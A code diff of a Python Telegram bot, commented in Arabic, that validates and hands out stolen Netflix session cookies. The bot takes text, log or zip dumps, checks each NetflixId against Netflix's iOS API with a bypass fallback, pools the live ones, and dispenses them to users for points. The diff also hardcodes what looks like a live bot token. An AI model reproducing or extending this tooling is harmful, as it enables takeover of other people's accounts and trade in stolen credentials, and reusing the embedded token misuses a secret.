@@ -13,16 +13,16 @@ from datetime import datetime
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from urllib3.exceptions import InsecureRequestWarning
 
-# --- إعدادات البوت والتوكن ---
+# إعدادات البوت والتوكن
 TOKEN = '8890151932:AAEMmm73E5r82FaSslWuRH96O8nSu-NBZ3o'
 bot = telebot.TeleBot(TOKEN)
 
-# 👑 إعدادات المطور الخاصة بك (فارس)
+# إعدادات المطور
 DEVELOPER_CHAT_ID = 8713916851
 DEVELOPER_USERNAME = "farxxes"
 CHANNEL_LINK = "https://t.me/farxxess"
 
-# إعدادات السيرفرات العشوائية
+# السيرفرات العشوائية
 api_hosts = [
     "https://nftokengen-7ik6.onrender.com",
     "https://netflixtokengenapi.onrender.com"
@@ -36,17 +36,15 @@ BASE_TEMP_DIR = "final_output_temp"
 if not os.path.exists(BASE_TEMP_DIR):
     os.makedirs(BASE_TEMP_DIR)
 
-# ====================================================
-# نظام الحفظ الدائم بملفات JSON
-# ====================================================
+# نظام الحفظ الدائم
 DB_DIR = "database"
 if not os.path.exists(DB_DIR):
     os.makedirs(DB_DIR)
 
-DB_USERS_FILE      = os.path.join(DB_DIR, "users.json")
-DB_BANNED_FILE     = os.path.join(DB_DIR, "banned.json")
-DB_COOKIES_FILE    = os.path.join(DB_DIR, "cookies_pool.json")
-DB_HISTORY_FILE    = os.path.join(DB_DIR, "used_history.json")
+DB_USERS_FILE = os.path.join(DB_DIR, "users.json")
+DB_BANNED_FILE = os.path.join(DB_DIR, "banned.json")
+DB_COOKIES_FILE = os.path.join(DB_DIR, "cookies_pool.json")
+DB_HISTORY_FILE = os.path.join(DB_DIR, "used_history.json")
 
 db_lock = threading.Lock()
 
@@ -55,7 +53,7 @@ def load_json(path, default):
         if os.path.exists(path):
             with open(path, "r", encoding="utf-8") as f:
                 return json.load(f)
-    except Exception:
+    except:
         pass
     return default
 
@@ -68,8 +66,8 @@ def load_all_data():
     global USER_DATABASE, BANNED_USERS, VALID_COOKIES_POOL, USED_COOKIES_HISTORY
     raw_users = load_json(DB_USERS_FILE, {})
     USER_DATABASE = {int(k): v for k, v in raw_users.items()}
-    BANNED_USERS  = set(load_json(DB_BANNED_FILE, []))
-    VALID_COOKIES_POOL   = load_json(DB_COOKIES_FILE, [])
+    BANNED_USERS = set(load_json(DB_BANNED_FILE, []))
+    VALID_COOKIES_POOL = load_json(DB_COOKIES_FILE, [])
     USED_COOKIES_HISTORY = set(load_json(DB_HISTORY_FILE, []))
     print(f"✅ تم تحميل البيانات: {len(USER_DATABASE)} مستخدم | {len(VALID_COOKIES_POOL)} كوكيز | {len(BANNED_USERS)} محظور")
 
@@ -87,7 +85,6 @@ def save_history():
 
 load_all_data()
 
-# ====================================================
 # إعدادات الطلبات
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 QUERY_PARAMS = {
@@ -110,13 +107,12 @@ BASE_HEADERS = {
     "accept-language": "en-US;q=1",
 }
 
-# ====================================================
 # ديكورات التحقق
 def check_ban(func):
     def wrapper(message, *args, **kwargs):
         try:
             chat_id = message.chat.id if hasattr(message, 'chat') else message.message.chat.id
-        except Exception:
+        except:
             chat_id = message.message.chat.id
         if chat_id in BANNED_USERS:
             bot.send_message(chat_id, "❌ عذراً، تم حظرك من استخدام البوت من قبل الإدارة.")
@@ -129,7 +125,6 @@ def ensure_user(chat_id, username=""):
         USER_DATABASE[chat_id] = {"points": 5, "username": username, "role": "MEMBER"}
         save_users()
 
-# ============================
 # استخراج معرفات نيتفلكس من النص
 def extract_clean_netflix_ids(text):
     cleaned_ids = []
@@ -145,7 +140,6 @@ def extract_clean_netflix_ids(text):
             cleaned_ids.append(decoded)
     return cleaned_ids
 
-# ====================================================
 # التحقق من الكوكيز وتفاصيل الحساب
 def check_netflix_cookie_detailed(netflix_id):
     headers = dict(BASE_HEADERS)
@@ -169,10 +163,9 @@ def check_netflix_cookie_detailed(netflix_id):
         if res_fallback.status_code in [200, 302] and "login" not in res_fallback.headers.get("Location", "").lower():
             return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "bypass": True}
         return None
-    except Exception:
+    except:
         return None
 
-# ====================================================
 # وظيفة التحقق من صلاحية الكوكيز بشكل دوري
 def auto_clean_pool_job():
     while True:
@@ -185,8 +178,7 @@ def auto_clean_pool_job():
 
 threading.Thread(target=auto_clean_pool_job, daemon=True).start()
 
-# ============================
-# إرسال رسالة بشكل آمن مع التعامل مع أخطاء الـ API
+# إرسال رسالة بشكل آمن مع التعامل مع أخطاء API
 def safe_send_message(chat_id, text, markup=None):
     while True:
         try:
@@ -199,8 +191,7 @@ def safe_send_message(chat_id, text, markup=None):
                 break
     return None
 
-# ============================
-# فحص كوكيز متعدد ومعالجة النتائج
+# فحص كوكيز ومعالجتها بشكل متزامن
 def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_name):
     ensure_user(chat_id)
     total_count = len(netflix_ids)
@@ -218,7 +209,7 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
         if index % 5 == 0 or index == total_count:
             try:
                 bot.edit_message_text(f"⏳ جاري الفحص: ({index}/{total_count})\n✅ شغال: {live_count} | ❌ ميت: {dead_count} | ✂️ مكرر: {dup_count}", chat_id, status.message_id, reply_markup=stop_markup)
-            except Exception:
+            except:
                 pass
         result = check_netflix_cookie_detailed(netflix_id)
         if result:
@@ -285,6 +276,7 @@ def send_txt_file(chat_id, accounts_list, original_filename):
     except Exception as e:
         print(e)
 
+# توليد لوحة مفاتيح رئيسية
 def generate_main_keyboard(user_id):
     points = USER_DATABASE.get(user_id, {}).get("points", 5)
     role = USER_DATABASE.get(user_id, {}).get("role", "MEMBER")
@@ -304,8 +296,7 @@ def generate_main_keyboard(user_id):
         markup.add(InlineKeyboardButton("👑 لوحة تحكم المطور السريّة", callback_data="open_admin_panel"))
     return markup
 
-# ============================
-# أوامر بدء التشغيل
+# أوامر البدء
 @bot.message_handler(commands=['start'])
 @check_ban
 def send_welcome(message):
@@ -434,8 +425,7 @@ def execute_dispense_logic(chat_id):
             continue
     return {"status": "expired", "message": "❌ عذراً، انتهت صلاحية الكوكيز المتوفرة بالمخزن فجأة."}
 
-# ============================
-# التعامل مع استعلامات الـ callback
+# استعلامات الـ callback
 @bot.callback_query_handler(func=lambda call: call.data == "ask_how_to_use")
 @check_ban
 def handle_ask_method(call):
@@ -609,52 +599,32 @@ def process_zip_entry(message, file_path, password=None, password_msg_id=None, o
     else:
         bot.send_message(chat_id, f"❌ حدث خطأ أثناء المعالجة: {error_type}")
 
+# استلام ملفات
 @bot.message_handler(content_types=['document'])
 @check_ban
 def handle_incoming_document(message):
     file_name = message.document.file_name or "file.txt"
     file_name_lower = file_name.lower()
+    file_info = bot.get_file(message.document.file_id)
+    local_path = os.path.join(BASE_TEMP_DIR, f"incoming_{message.chat.id}_{int(time.time())}{os.path.splitext(file_name)[1]}")
+    with open(local_path, 'wb') as f:
+        f.write(bot.download_file(file_info.file_path))
     if file_name_lower.endswith('.zip'):
-        file_info = bot.get_file(message.document.file_id)
-        local_path = os.path.join(BASE_TEMP_DIR, f"incoming_{message.chat.id}_{int(time.time())}.zip")
-        with open(local_path, 'wb') as f:
-            f.write(bot.download_file(file_info.file_path))
         process_zip_entry(message, local_path, original_name=file_name)
     elif file_name_lower.endswith('.txt') or file_name_lower.endswith('.log'):
-        file_info = bot.get_file(message.document.file_id)
-        file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
-        process_cookies_list_and_check(message.chat.id, extract_clean_netflix_ids(file_content), message.message_id, source_name=file_name)
+        with open(local_path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        process_cookies_list_and_check(message.chat.id, extract_clean_netflix_ids(content), message.message_id, source_name=file_name)
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith('fanal_'))
-@check_ban
-def handle_inline_passwords(call):
-    data_parts = call.data.split('_')
-    chosen_password = data_parts[1]
-    remaining_parts = data_parts[2:]
-    original_name = remaining_parts[-1]
-    file_path = "_".join(remaining_parts[:-1])
-    if os.path.exists(file_path):
-        process_zip_entry(call.message, file_path, password=chosen_password, password_msg_id=call.message.message_id, original_name=original_name)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_scan_'))
-def handle_stop_button(call):
-    target_chat_id = int(call.data.split('_')[2])
-    if target_chat_id in active_scans:
-        active_scans[target_chat_id] = False
-        bot.answer_callback_query(call.id, "🛑 جاري إيقاف عملية الفحص الحالية بناءً على طلبك...")
-        try:
-            bot.edit_message_reply_markup(target_chat_id, call.message.message_id, reply_markup=None)
-        except:
-            pass
-
-@bot.message_handler(func=lambda message: True)
+# استلام النصوص مباشرة
+@bot.message_handler(func=lambda m: True)
 @check_ban
 def handle_plain_text(message):
     process_cookies_list_and_check(message.chat.id, extract_clean_netflix_ids(message.text), message.message_id, source_name="Direct_Text.txt")
 
-# بداية التشغيل
+# بدء البوت
 if __name__ == "__main__":
-    print("🚀 تم تشغيل البوت بنجاح مع نظام الحفظ الدائم (JSON Database)...")
+    print("🚀 تم تشغيل البوت بنجاح مع نظام الفحص التلقائي...")
     while True:
         try:
             bot.polling(none_stop=True, skip_pending=True)
